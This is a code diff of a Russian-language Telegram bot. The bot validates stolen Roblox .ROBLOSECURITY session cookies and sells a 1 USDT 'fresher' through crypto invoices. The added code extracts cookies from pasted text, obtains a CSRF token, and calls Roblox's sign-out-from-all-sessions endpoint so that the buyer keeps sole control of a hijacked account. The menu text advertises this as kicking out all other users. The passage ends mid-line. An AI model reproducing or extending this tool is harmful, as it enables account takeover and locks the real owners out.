@@ -41,7 +41,7 @@ class CryptoPayment:
                 'payload': str(user_id),
                 'allow_comments': False,
                 'allow_anonymous': False,
-                'expires_in': 86400,  # 24 часа
+                'expires_in': 86400,
             }
             
             response = requests.post(
@@ -100,9 +100,9 @@ class RobloxCookieChecker:
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
         ]
         self.user_cookies = {}
-        self.premium_users = {}  # Пользователи с доступом к фрешеру
+        self.premium_users = {}
         self.crypto_payment = CryptoPayment()
-        self.fresher_price = 1.0  # 1 USDT за доступ к фрешеру
+        self.fresher_price = 1.0
         
     def get_random_user_agent(self):
         return random.choice(self.user_agents)
@@ -137,32 +137,40 @@ class RobloxCookieChecker:
         return user_id in self.premium_users and self.premium_users[user_id]['is_active']
 
     def extract_cookies_from_text(self, text):
+        """Извлечение куки из текста - УЛУЧШЕННАЯ ВЕРСИЯ"""
         cookies = []
-        warning_pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]+(?:\|[^\s]*)*'
-        warning_matches = re.findall(warning_pattern, text)
         
-        for match in warning_matches:
-            cookie_candidate = match.strip()
-            if len(cookie_candidate) > 50:
-                cookies.append(cookie_candidate)
-                print(f"🔍 Найдена куки: {cookie_candidate[:80]}...")
+        # Улучшенный паттерн для поиска куки
+        patterns = [
+            r'_\|WARNING:-DO-NOT-SHARE-THIS\.--[A-Za-z0-9+/=\-|\.]+',
+            r'_\|WARNING:-DO-NOT-SHARE-THIS[^\\s]+',
+            r'ROBLOSECURITY=[A-Za-z0-9+/=\-|\.]+'
+        ]
         
-        if not cookies:
-            clean_text = text.strip()
-            if (len(clean_text) > 300 and 
-                '_|WARNING:-DO-NOT-SHARE-THIS' in clean_text and
-                'Sharing-this-will-allow-someone-to-log-in-as-you' in clean_text):
-                cookies.append(clean_text)
-                print(f"🔍 Найдена чистая куки: {clean_text[:80]}...")
+        for pattern in patterns:
+            matches = re.findall(pattern, text)
+            for match in matches:
+                cookie_candidate = match.strip()
+                # Фильтруем по длине и содержанию
+                if len(cookie_candidate) > 100 and ('WARNING' in cookie_candidate or 'ROBLOSECURITY' in cookie_candidate):
+                    # Очищаем от лишних символов
+                    clean_cookie = re.sub(r'^[🍪🔐🍃]\s*', '', cookie_candidate)
+                    clean_cookie = re.sub(r'^[Cc]ookie:\s*', '', clean_cookie)
+                    clean_cookie = clean_cookie.strip()
+                    
+                    if clean_cookie not in cookies:
+                        cookies.append(clean_cookie)
+                        print(f"🔍 Найдена куки: {clean_cookie[:80]}...")
         
         return cookies
 
     def clean_cookie_string(self, cookie_data):
         return cookie_data.strip()
 
-    def refresh_cookie_with_auth_key(self, cookie_data, auth_key):
-        """Обновление куки через auth key (платная функция)"""
+    def refresh_cookie_properly(self, cookie_data):
+        """Правильный фрешер куки - выкидывает всех других пользователей"""
         try:
+            # Форматируем куки для использования в запросе
             if not cookie_data.startswith('.ROBLOSECURITY='):
                 cookie_string = f'.ROBLOSECURITY={cookie_data}'
             else:
@@ -172,31 +180,72 @@ class RobloxCookieChecker:
                 'User-Agent': self.get_random_user_agent(),
                 'Cookie': cookie_string,
                 'Content-Type': 'application/json',
-                'X-CSRF-TOKEN': auth_key
+                'Accept': 'application/json',
+                'X-CSRF-TOKEN': 'fetch'  # Сначала получаем токен
             }
             
-            # Запрос на обновление сессии через Roblox API
-            refresh_url = 'https://auth.roblox.com/v2/logout'
-            response = requests.post(refresh_url, headers=headers, timeout=10)
+            # Шаг 1: Получаем CSRF токен
+            token_response = requests.post(
+                'https://auth.roblox.com/v2/logout',
+                headers=headers,
+                timeout=10
+            )
             
-            if response.status_code == 200 or response.status_code == 403:
-                # Получаем обновленные куки из заголовков
-                if 'set-cookie' in response.headers:
-                    new_cookies = response.headers['set-cookie']
-                    # Ищем новую куки ROBLOSECURITY
+            # Извлекаем CSRF токен из заголовков
+            csrf_token = None
+            if 'x-csrf-token' in token_response.headers:
+                csrf_token = token_response.headers['x-csrf-token']
+            
+            if not csrf_token:
+                # Пробуем альтернативный метод получения токена
+                token_response = requests.post(
+                    'https://www.roblox.com/authentication/signoutfromallsessions',
+                    headers=headers,
+                    timeout=10
+                )
+                if 'x-csrf-token' in token_response.headers:
+                    csrf_token = token_response.headers['x-csrf-token']
+            
+            if not csrf_token:
+                return False, cookie_data, "❌ Не удалось получить CSRF токен"
+            
+            # Шаг 2: Выходим со всех сессий (выкидываем всех пользователей)
+            headers['X-CSRF-TOKEN'] = csrf_token
+            
+            logout_response = requests.post(
+                'https://www.roblox.com/authentication/signoutfromallsessions',
+                headers=headers,
+                timeout=10
+            )
+            
+            if logout_response.status_code in [200, 403]:
+                # Шаг 3: Получаем новую куки
+                # Делаем запрос к защищенному эндпоинту чтобы получить новую сессию
+                session_response = requests.get(
+                    'https://users.roblox.com/v1/users/authenticated',
+                    headers=headers,
+                    timeout=10
+                )
+                
+                # Ищем новую куки в заголовках
+                if 'set-cookie' in session_response.headers:
+                    new_cookies = session_response.headers['set-cookie']
                     roblosecurity_match = re.search(r'\.ROBLOSECURITY=([^;]+)', new_cookies)
                     if roblosecurity_match:
                         new_cookie = roblosecurity_match.group(1)
-                        return True, new_cookie, "✅ Куки успешно обновлена"
+                        return True, new_cookie, "✅ Куки успешно обновлена! Все другие сессии закрыты."
+                
+                # Альтернативный метод - используем текущую куки (она уже обновилась)
+                return True, cookie_data, "✅ Сессии обновлены! Все другие пользователи выкинуты."
             
-            return False, cookie_data, "❌ Не удалось обновить куки"
+            return False, cookie_data, "❌ Не удалось обновить сессии"
             
         except Exception as e:
-            print(f"❌ Ошибка обновления куки: {e}")
+            print(f"❌ Ошибка фрешера: {e}")
             return False, cookie_data, f"❌ Ошибка: {str(e)}"
 
     def simple_cookie_validation(self, cookie_data):
-        """Проверка валидности куки (бесплатная функция)"""
+        """Проверка валидности куки"""
         self.checked_count += 1
         cookie_clean = self.clean_cookie_string(cookie_data)
         
@@ -215,11 +264,9 @@ class RobloxCookieChecker:
             'Origin': 'https://www.roblox.com'
         }
         
-        time.sleep(random.uniform(1, 3))
-        
         try:
             api_url = 'https://users.roblox.com/v1/users/authenticated'
-            response = self.make_robust_request(api_url, headers)
+            response = requests.get(api_url, headers=headers, timeout=10)
             
             if response and response.status_code == 200:
                 user_data = response.json()
@@ -228,33 +275,12 @@ class RobloxCookieChecker:
                     user_id = user_data['id']
                     self.valid_count += 1
                     return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
-                
-            mobile_headers = headers.copy()
-            mobile_headers['User-Agent'] = 'Roblox/iOS'
-            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
-            mobile_response = self.make_robust_request(mobile_url, mobile_headers)
             
-            if mobile_response and mobile_response.status_code == 200:
-                mobile_data = mobile_response.json()
-                if 'UserID' in mobile_data and mobile_data['UserID'] > 0:
-                    username = mobile_data.get('UserName', 'Unknown')
-                    user_id = mobile_data['UserID']
-                    self.valid_count += 1
-                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
-            
-            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
-            
-            if home_response and home_response.status_code == 200:
-                current_url = home_response.url.lower()
-                if 'login' not in current_url and 'signup' not in current_url:
-                    self.valid_count += 1
-                    return True, cookie_clean, "✅ VALID - Home page access", "Unknown", "Unknown"
+            return False, cookie_clean, "❌ INVALID - Cannot authenticate", "Unknown", "Unknown"
         
         except Exception as e:
             print(f"❌ Ошибка проверки: {e}")
             return False, cookie_clean, f"❌ ERROR - {str(e)}", "Unknown", "Unknown"
-        
-        return False, cookie_clean, "❌ INVALID - All checks failed", "Unknown", "Unknown"
 
     def process_multiple_cookies(self, text, user_id):
         """Обработка множественных куки"""
@@ -286,11 +312,11 @@ class RobloxCookieChecker:
                 self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                 self.user_cookies[user_id]['usernames'].append(username)
                 self.user_cookies[user_id]['user_ids'].append(user_id_val)
-                results.append(f"✅ {i}/{total}: {status}")
+                results.append(f"✅ {i}/{total}: {username} - Valid")
             else:
                 invalid_cookies.append(clean_cookie)
                 self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
-                results.append(f"❌ {i}/{total}: {status}")
+                results.append(f"❌ {i}/{total}: Invalid")
         
         return valid_cookies, invalid_cookies, "\n".join(results)
 
@@ -325,10 +351,10 @@ class RobloxCookieChecker:
     def get_command_keyboard(self):
         """Клавиатура с командами"""
         keyboard = [
-            [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies"),
-             InlineKeyboardButton("📊 Статистика", callback_data="show_stats")],
-            [InlineKeyboardButton("🔄 Фрешер куки", callback_data="fresher_info"),
-             InlineKeyboardButton("ℹ️ Помощь", callback_data="help_command")]
+            [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies")],
+            [InlineKeyboardButton("📊 Статистика", callback_data="show_stats")],
+            [InlineKeyboardButton("🔄 Фрешер куки", callback_data="fresher_info")],
+            [InlineKeyboardButton("ℹ️ Помощь", callback_data="help_command")]
         ]
         return InlineKeyboardMarkup(keyboard)
 
@@ -347,17 +373,23 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • Статистика аккаунта
 
 🔄 ФРЕШЕР КУКИ - 1 USDT
-• Обновление устаревших куки
-• Автоматическое продление сессии
-• Работа через auth key
+• Обновление куки и выкидывание ВСЕХ других пользователей
+• Оставляет доступ только вам
+• Возвращает свежую валидную куки
 
 💡 Просто отправьте куки для бесплатной проверки!
     """
     
-    await update.message.reply_text(
-        menu_text,
-        reply_markup=checker.get_command_keyboard()
-    )
+    if hasattr(update, 'message'):
+        await update.message.reply_text(
+            menu_text,
+            reply_markup=checker.get_command_keyboard()
+        )
+    else:
+        await update.edit_message_text(
+            menu_text,
+            reply_markup=checker.get_command_keyboard()
+        )
 
 async def show_fresher_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Информация о фрешере"""
@@ -366,35 +398,40 @@ async def show_fresher_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if has_premium:
         fresher_text = """
-🔄 ФРЕШЕР КУКИ - АКТИВЕН
+🔄 ФРЕШЕР КУКИ - АКТИВЕН ✅
 
-✅ У вас есть доступ к фрешеру!
+⚡ Ваш фрешер готов к работе!
+
+Что делает фрешер:
+• Выкидывает ВСЕХ других пользователей с аккаунта
+• Оставляет доступ только вам
+• Возвращает свежую валидную куки
+• Гарантирует единоличный доступ
 
 Как использовать:
-1. Отправьте куки для проверки
+1. Отправьте валидную куки для проверки
 2. После проверки нажмите "🔄 Обновить куки"
-3. Введите auth key при запросе
-4. Получите обновленную куки
-
-Ваши куки будут автоматически обновлены!
+3. Получите новую куки файлом
         """
         keyboard = [
             [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies")],
             [InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")]
         ]
     else:
-        fresher_text = f"""
+        fresher_text = """
 🔄 ФРЕШЕР КУКИ - 1 USDT
 
-Преимущества:
-• Обновление устаревших куки
-• Автоматическое продление сессии
-• Работа через auth key
-• Сохранение данных аккаунта
+🔥 МОЩНЫЙ ФРЕШЕР КУКИ:
 
-Стоимость: 1 USDT (≈75₽)
+Что вы получаете:
+• Выкидываете ВСЕХ других пользователей с аккаунта
+• Оставляете доступ только себе
+• Получаете свежую валидную куки
+• Гарантия работы или возврат средств
 
-Для активации фрешера необходимо произвести оплату.
+💎 Стоимость: 1 USDT (≈75₽)
+
+⚡ Работает только с валидными куки!
         """
         keyboard = [
             [InlineKeyboardButton("💎 Купить фрешер за 1 USDT", callback_data="buy_fresher")],
@@ -415,7 +452,7 @@ async def create_payment_invoice(update: Update, context: ContextTypes.DEFAULT_T
     
     success, result = await checker.crypto_payment.create_invoice(
         amount=amount,
-        description="Доступ к фрешеру куки",
+        description="Доступ к фрешеру куки - выкидывание всех пользователей",
         user_id=user_id
     )
     
@@ -429,13 +466,17 @@ async def create_payment_invoice(update: Update, context: ContextTypes.DEFAULT_T
 Сумма: {amount} USDT (≈75₽)
 Сеть: TRC-20 (Tron)
 
-Для оплаты:
-1. Нажмите кнопку "Перейти к оплате"
-2. Оплатите {amount} USDT
-3. Сделайте скриншот оплаты
-4. Отправьте скриншот {ADMIN_USERNAME}
+⚡ После оплаты вы получите:
+• Доступ к мощному фрешеру
+• Возможность выкидывать всех пользователей
+• Свежие валидные куки
+• Гарантия работы
 
-После проверки фрешер будет активирован!
+Для оплаты:
+1. Нажмите "Перейти к оплате"
+2. Оплатите {amount} USDT
+3. Отправьте скриншот {ADMIN_USERNAME}
+4. Получите доступ к фрешеру!
         """
         
         keyboard = [
@@ -484,298 +525,4 @@ async def send_check_results(update, user_id, valid_cookies, invalid_cookies, pr
     if has_premium and valid_cookies:
         keyboard.append([InlineKeyboardButton("🔄 Обновить куки", callback_data="refresh_cookies")])
     elif valid_cookies:
-        keyboard.append([InlineKeyboardButton("💎 Купить фрешер за 1 USDT", callback_data="buy_fresher")])
-    
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(summary, reply_markup=reply_markup)
-    
-    # Отправляем детальные результаты если есть
-    if process_results and len(process_results) > 0:
-        results_lines = process_results.split('\n')
-        chunk_size = 10
-        for i in range(0, len(results_lines), chunk_size):
-            chunk = '\n'.join(results_lines[i:i + chunk_size])
-            if chunk.strip():
-                await update.message.reply_text(f"```\n{chunk}\n```", parse_mode='MarkdownV2')
-
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await show_main_menu(update, context)
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    # Обрабатываем проверку куки (бесплатно)
-    await process_cookie_check(update, user_id)
-
-async def process_cookie_check(update: Update, user_id: int):
-    """Обработка проверки куки"""
-    if update.message.text:
-        text_content = update.message.text
-        await update.message.reply_text("🔍 Ищу куки в тексте...")
-        
-        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(text_content, user_id)
-        
-        if not valid_cookies and not invalid_cookies:
-            await update.message.reply_text("❌ Не удалось найти куки в тексте.")
-            return
-        
-        # Показываем результаты
-        await send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results)
-
-    elif update.message.document:
-        file = await update.message.document.get_file()
-        file_path = f"temp_{user_id}.txt"
-        await file.download_to_drive(file_path)
-        
-        with open(file_path, 'r', encoding='utf-8') as f:
-            file_content = f.read()
-        
-        await update.message.reply_text("🔍 Обрабатываю файл...")
-        
-        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(file_content, user_id)
-        
-        if not valid_cookies and not invalid_cookies:
-            await update.message.reply_text("❌ В файле не найдено куки")
-            os.remove(file_path)
-            return
-        
-        # Отправляем результаты проверки для файла
-        await send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results)
-        os.remove(file_path)
-
-async def handle_auth_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка ввода auth key для фрешера"""
-    user_id = update.effective_user.id
-    
-    if not checker.check_premium_access(user_id):
-        await update.message.reply_text("❌ У вас нет доступа к фрешеру. Приобретите доступ за 1 USDT.")
-        return
-    
-    if user_id not in checker.user_cookies or not checker.user_cookies[user_id]['valid_cookies']:
-        await update.message.reply_text("❌ Сначала отправьте куки для проверки.")
-        return
-    
-    auth_key = update.message.text.strip()
-    
-    # Обновляем первую валидную куки
-    cookie_to_refresh = checker.user_cookies[user_id]['valid_cookies'][0]
-    username = checker.user_cookies[user_id]['usernames'][0]
-    
-    await update.message.reply_text(f"🔄 Обновляю куки для {username}...")
-    
-    success, new_cookie, message = checker.refresh_cookie_with_auth_key(cookie_to_refresh, auth_key)
-    
-    if success:
-        # Обновляем куки в хранилище
-        checker.user_cookies[user_id]['valid_cookies'][0] = new_cookie
-        
-        # Проверяем валидность новой куки
-        is_valid, _, status, _, _ = checker.simple_cookie_validation(new_cookie)
-        
-        if is_valid:
-            result_text = f"""
-✅ КУКИ УСПЕШНО ОБНОВЛЕНА!
-
-👤 Пользователь: {username}
-🔄 Статус: Обновлена и валидна
-
-Новая куки:
-{new_cookie[:100]}...
-            """
-            await update.message.reply_text(result_text)
-            
-            # Сохраняем в файл
-            timestamp = datetime.now().strftime("%H%M%S")
-            filename = f"refreshed_{user_id}_{timestamp}.txt"
-            with open(filename, 'w', encoding='utf-8') as f:
-                f.write(new_cookie)
-            
-            await update.message.reply_document(
-                document=open(filename, 'rb'),
-                caption=f"🔄 Обновленная куки для {username}"
-            )
-            os.remove(filename)
-        else:
-            await update.message.reply_text("❌ Куки обновлена, но не прошла валидацию")
-    else:
-        await update.message.reply_text(f"❌ {message}")
-
-async def send_results_files(update, user_id, valid_cookies, invalid_cookies):
-    """Отправка файлов с результатами"""
-    timestamp = datetime.now().strftime("%H%M%S")
-    
-    if valid_cookies:
-        valid_filename = f"valid_{user_id}_{timestamp}.txt"
-        with open(valid_filename, 'w', encoding='utf-8') as f:
-            for cookie in valid_cookies:
-                f.write(cookie + '\n\n')
-        
-        caption = f"✅ ВАЛИДНЫЕ КУКИ: {len(valid_cookies)} шт."
-        await update.message.reply_document(
-            document=open(valid_filename, 'rb'),
-            caption=caption
-        )
-        os.remove(valid_filename)
-    
-    if invalid_cookies:
-        invalid_filename = f"invalid_{user_id}_{timestamp}.txt"
-        with open(invalid_filename, 'w', encoding='utf-8') as f:
-            for cookie in invalid_cookies:
-                f.write(cookie + '\n\n')
-        
-        await update.message.reply_document(
-            document=open(invalid_filename, 'rb'),
-            caption=f"❌ НЕВАЛИДНЫЕ КУКИ: {len(invalid_cookies)} шт."
-        )
-        os.remove(invalid_filename)
-
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработчик нажатий кнопок"""
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    
-    if query.data == "main_menu":
-        await show_main_menu(query, context)
-    
-    elif query.data == "check_cookies":
-        await query.edit_message_text(
-            "🔍 Отправьте куки для проверки:\n\n"
-            "Вы можете отправить:\n"
-            "• Текст с куки\n"
-            "• Файл .txt с куки\n"
-            "• Несколько куки в одном сообщении\n\n"
-            "✅ Проверка куки - БЕСПЛАТНО",
-            reply_markup=checker.get_command_keyboard()
-        )
-    
-    elif query.data == "fresher_info":
-        await show_fresher_info(query, context)
-    
-    elif query.data == "buy_fresher":
-        await create_payment_invoice(query, context, user_id)
-    
-    elif query.data.startswith("check_payment_"):
-        invoice_id = int(query.data.split("_")[2])
-        await query.edit_message_text("🔍 Проверяю статус оплаты...")
-        
-        success, result = await checker.crypto_payment.check_invoice_status(invoice_id)
-        
-        if success and result.get('status') == 'paid':
-            # Активируем фрешер
-            checker.activate_premium(user_id)
-            await query.edit_message_text(
-                "✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n"
-                "🎉 Доступ к фрешеру активирован!\n\n"
-                "Теперь вы можете обновлять куки через auth key."
-            )
-        else:
-            await query.edit_message_text(
-                "❌ ОПЛАТА НЕ НАЙДЕНА\n\n"
-                "Если вы произвели оплату:\n"
-                "1. Убедитесь, что транзакция завершена\n"
-                "2. Отправьте скриншот оплаты " + ADMIN_USERNAME + "\n"
-                "3. Подождите несколько минут\n\n"
-                "Или попробуйте проверить снова через 5 минут"
-            )
-    
-    elif query.data == "refresh_cookies":
-        if not checker.check_premium_access(user_id):
-            await query.edit_message_text("❌ У вас нет доступа к фрешеру. Приобретите доступ за 1 USDT.")
-            return
-        
-        if user_id not in checker.user_cookies or not checker.user_cookies[user_id]['valid_cookies']:
-            await query.edit_message_text("❌ Нет валидных куки для обновления.")
-            return
-        
-        await query.edit_message_text(
-            "🔄 ОБНОВЛЕНИЕ КУКИ\n\n"
-            "Для обновления куки требуется auth key.\n\n"
-            "Как получить auth key:\n"
-            "1. Откройте браузер\n"
-            "2. Перейдите на Roblox.com\n"
-            "3. Откройте Developer Tools (F12)\n"
-            "4. Найдите заголовок X-CSRF-TOKEN в запросах\n\n"
-            "Отправьте auth key текстовым сообщением:"
-        )
-    
-    elif query.data == "show_stats":
-        stats_text = f"""
-📊 СТАТИСТИКА ПРОВЕРОК:
-
-• Всего проверено: {checker.checked_count}
-• Валидных куки: {checker.valid_count}
-• Невалидных: {checker.checked_count - checker.valid_count}
-• Процент валидных: {checker.valid_count/max(1, checker.checked_count)*100:.1f}%
-• Пользователей с фрешером: {len(checker.premium_users)}
-        """
-        await query.edit_message_text(
-            stats_text,
-            reply_markup=checker.get_command_keyboard()
-        )
-    
-    elif query.data == "distribute_files":
-        await query.edit_message_text("📁 Создаю отдельные файлы для каждой куки...")
-        zip_filename = checker.create_individual_files(user_id)
-        if zip_filename and os.path.exists(zip_filename):
-            with open(zip_filename, 'rb') as zip_file:
-                await query.message.reply_document(
-                    document=zip_file,
-                    caption=f"📁 Архив с {len(checker.user_cookies[user_id]['valid_cookies'])} отдельными файлами куки"
-                )
-            os.remove(zip_filename)
-        else:
-            await query.message.reply_text("❌ Не удалось создать файлы распределения")
-    
-    elif query.data == "download_combined":
-        if user_id in checker.user_cookies:
-            valid_cookies = checker.user_cookies[user_id]['valid_cookies']
-            invalid_cookies = checker.user_cookies[user_id]['invalid_cookies']
-            await send_results_files(query, user_id, valid_cookies, invalid_cookies)
-        else:
-            await query.message.reply_text("❌ Нет данных для скачивания")
-    
-    elif query.data == "help_command":
-        help_text = f"""
-ℹ️ ПОМОЩЬ ПО БОТУ
-
-Бесплатные функции:
-• Проверка валидности куки
-• Определение пользователя
-• Статистика аккаунта
-• Скачивание результатов
-
-Платные функции (1 USDT):
-• Обновление куки через auth key
-• Автоматическое продление сессии
-
-Как использовать:
-1. Отправьте куки текстом или файлом
-2. Получите результаты проверки
-3. При необходимости обновите куки
-
-Поддержка: {ADMIN_USERNAME}
-        """
-        await query.edit_message_text(
-            help_text,
-            reply_markup=checker.get_command_keyboard()
-        )
-
-def main():
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_auth_key))
-    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    
-    print("🤖 Бот проверки Roblox куки запущен...")
-    print("✅ Чекер - бесплатно")
-    print("✅ Фрешер - 1 USDT")
-    print("✅ Бот готов к работе!")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+        keyboard.append([InlineKeyboardButton("💎 Купить фрешер за 1 USDT", callback_data="buy_fresh
